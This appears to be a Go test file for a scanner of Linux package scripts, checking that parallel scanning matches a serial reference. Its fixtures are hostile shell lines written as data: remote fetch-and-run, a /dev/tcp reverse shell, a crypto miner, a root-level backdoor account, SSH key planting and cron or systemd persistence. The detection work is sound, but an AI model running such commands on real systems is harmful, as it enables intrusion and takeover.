package linuxpkg

import (
	"reflect"
	"strings"
	"testing"
)

// serialScan is the scan as one loop: every vector in table order, first script to
// match wins, one finding per class. It is the reference for what the fan-out must
// reproduce.
func serialScan(scripts []scriptSource) []Finding {
	seen := map[string]bool{}
	var out []Finding
	for _, v := range scriptVectors {
		if f := firstMatch(v, scripts); f != nil && !seen[f.Class] {
			seen[f.Class] = true
			out = append(out, *f)
		}
	}
	return out
}

// Findings must not depend on how the work was split: the same text has to give
// the same classes, in the same order, with the same evidence.
func TestScanScriptsIsTheSameInParallel(t *testing.T) {
	lines := []string{
		"curl -s http://198.51.100.1/x | sh",
		"bash -i >& /dev/tcp/198.51.100.1/443 0>&1",
		"echo aGk= | base64 -d | sh",
		"wget http://198.51.100.1/m -O /tmp/m && chmod +x /tmp/m && /tmp/m",
		"xmrig --donate-level 1 -o pool.example:3333",
		"useradd -o -u 0 toor",
		"echo 'ssh-rsa AAAA' >> /root/.ssh/authorized_keys",
		"(crontab -l; echo '* * * * * /tmp/m') | crontab -",
		"systemctl enable backdoor.service",
	}
	big := strings.Join(lines, "\n") + "\n" + strings.Repeat("# nothing of note here\n", parallelFrom/23+1)
	if len(big) < parallelFrom {
		t.Fatalf("the fixture must reach the parallel path: %d bytes", len(big))
	}
	scripts := []scriptSource{{name: "a", body: big}}
	want := serialScan(scripts)
	if len(want) < 4 {
		t.Fatalf("the fixture must match several vectors: %+v", want)
	}
	for range 20 {
		if got := scanScripts(scripts); !reflect.DeepEqual(want, got) {
			t.Fatalf("results differ:\n%+v\n%+v", want, got)
		}
	}
}

// One finding per class, from the first script that matches, whichever finishes
// first.
func TestFirstScriptWinsAClassInParallel(t *testing.T) {
	pad := strings.Repeat("# padding\n", parallelFrom/10+1)
	body := "curl -s http://198.51.100.1/x | sh\n"
	got := scanScripts([]scriptSource{{name: "first", body: pad + body}, {name: "second", body: pad + body}})
	seen := map[string]bool{}
	for _, f := range got {
		if seen[f.Class] {
			t.Fatalf("class %s reported twice", f.Class)
		}
		seen[f.Class] = true
		if !strings.HasPrefix(f.Evidence, "first: ") {
			t.Fatalf("%s came from the wrong script: %s", f.Class, f.Evidence)
		}
	}
	if len(got) == 0 {
		t.Fatal("the fixture must match")
	}
}
